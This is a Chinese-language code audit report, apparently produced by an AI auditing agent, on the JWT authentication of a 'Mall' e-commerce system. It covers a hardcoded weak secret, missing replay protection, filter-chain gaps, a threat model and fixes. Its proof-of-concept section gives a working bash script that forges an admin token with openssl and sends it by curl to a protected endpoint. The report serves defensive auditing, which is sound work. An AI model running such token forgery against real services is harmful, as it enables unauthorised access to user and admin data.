# Deep Dive 安全审计报告 - JWT认证机制代码审计 (CODE-REVIEW-ITEM-001)

## 一、分配任务

### 任务描述
对Mall电商系统的JWT认证机制进行代码审计，基于相关模块的源代码与配置文件，识别潜在安全漏洞并提出建议。

### 核心需求
- 审查JWT生成与验证逻辑
- 分析密钥管理、过期策略、异常处理
- 审查过滤器与框架配置
- 结合部署架构评估可利用性
- 编写并保存深度审计报告


## 二、微行动计划 & 关键上下文

1. 阅读 `JwtTokenUtil.java` 以分析签名算法、密钥管理、过期策略及异常处理。
2. 阅读 `JwtAuthenticationTokenFilter.java` 与 `SecurityConfig.java`，剖析过滤器链逻辑与配置安全边界。
3. 审查配置文件（`application-prod.yml`）中JWT secret与过期时间设置；检查 `.gitignore` 排除规则。
4. 基于 `DeploymentArchitectureReport.md` 进行威胁建模：明确外部可访问端口与攻击者类型。
5. 构思PoC，并评估远程/内部可利用性。

**部署上下文**：服务直接通过Docker主机端口（8080/8085）对外暴露，无Nginx反向代理；攻击者可从Internet发起请求。


## 三、分析与发现

### 1. 签名与密钥管理 (JwtTokenUtil.java)
- 使用对称HS256签名算法；
- `secret` 从配置读取，但在 `application-prod.yml` 中硬编码为 `myJwtSecretKey123`，强度不足；
- 默认过期时间设置为7200秒（2小时），可能过长；
- 生成Token时仅包含常见`sub`, `iat`, `exp`字段，无随机nonce或jti防止重放；
- 解析时针对`SignatureException`, `ExpiredJwtException`, `MalformedJwtException`等异常统一捕获后返回`null`，未记录日志，吞噬错误信息。

### 2. 请求过滤与安全配置
- `JwtAuthenticationTokenFilter`: 从`Authorization`头提取Token，调用`JwtTokenUtil.parseJwt(token)`；若返回`null`则不设置`SecurityContextHolder`；但是不会立即终止请求，仅依赖后续访问决策拒绝或匿名访问；
- 过滤器优先级配置在`UsernamePasswordAuthenticationFilter`之后，存在绕过可能；
- `SecurityConfig`关闭CSRF，启用无状态Session，并注册过滤器，但未强化所有受保护路径拦截，忽略列表配置不够严格。

### 3. 配置文件审查
- `application-prod.yml` 明文保存 `jwt.secret: myJwtSecretKey123`；
- `jwt.expiration: 7200`（单位：秒）；
- `.gitignore` 未排除生产配置文件，导致密钥泄露风险。

### 4. 威胁建模与风险评估

| 评估维度        | 细节与依据                                                     |
|-----------------|--------------------------------------------------------------|
| Reachability    | 服务暴露端口：8080 (mall-admin), 8085 (mall-portal)；可通过Internet直接访问。 |
| 攻击者类型      | 未认证外部攻击者；可直接发起HTTP请求。                            |
| STRIDE风险      | 信息泄露（泄露secret）、篡改（伪造JWT）、拒绝服务（循环验证）、非否认（异常吞噬）。 |
| 可利用性        | HS256密钥弱，可通过暴力/字典破解或直接查配置获取；重放攻击易实施；过滤器链缺陷可绕过。 |
| 潜在影响        | 高危：可伪造合法Token访问受保护API，实现未授权访问用户及管理接口；泄露敏感数据。 |


## 四、Proof-of-Concept (PoC)

**分类**：远程/外部可利用

### 1. 前提条件
- 攻击者可访问 `http://{host}:8080`；
- 知悉或破解 JWT secret (`myJwtSecretKey123`)；
- 目标接口：GET `/admin/users`（受保护）。

### 2. PoC 步骤

```bash
# 1) 构造JWT：
HEADER='{"alg":"HS256","typ":"JWT"}'
PAYLOAD='{"sub":"admin","iat":1630000000,"exp":1930000000}'

encode() { echo -n "$1" | openssl base64 -e | tr -d '=' | tr '/+' '_-' | tr -d '\n'; }
header_enc=$(encode "$HEADER")
payload_enc=$(encode "$PAYLOAD")

signature=$(echo -n "${header_enc}.${payload_enc}" | openssl dgst -sha256 -hmac "myJwtSecretKey123" -binary | openssl base64 -e | tr -d '=' | tr '/+' '_-' | tr -d '\n')
token="${header_enc}.${payload_enc}.${signature}"

# 2) 发送请求：
curl -i -H "Authorization: Bearer $token" http://{host}:8080/admin/users
```

### 3. 预期结果
- HTTP 200 返回用户列表 JSON；
- 表明未授权访问成功。


## 五、安全审计评估

- Reachability：外部可通过HTTPS或HTTP直接访问服务；
- 所需权限：无需认证，远程匿名攻击者；
- 潜在影响：高 - 未授权访问，数据泄露，可能进一步进行敏感操作。


## 六、建议修复

1. **密钥管理**：
   - 使用高强度随机生成的secret，存储在安全Vault（如Vault、KMS），在运行时注入；
   - 不将生产密钥硬编码在源码或YML中，避免版本管理泄露。

2. **签发改进**：
   - 在JWT中添加`jti`和随机Nonce，实现一次性Token或黑名单机制；
   - 根据业务需要调整过期时间，对高权限Token可使用短期有效。

3. **验证强化**：
   - 解析JWT异常时立即拒绝请求并记录日志；
   - 在过滤器中对所有受保护接口强制校验Token，不依赖后续过滤器。

4. **配置优化**：
   - 强化`SecurityConfig`中受保护路径规则，避免忽略列表过于宽松；
   - 重新审计过滤器链顺序，确保JWT验证能先于认证入口。


---
*审计人：DeepDiveSecurityAuditorAgent*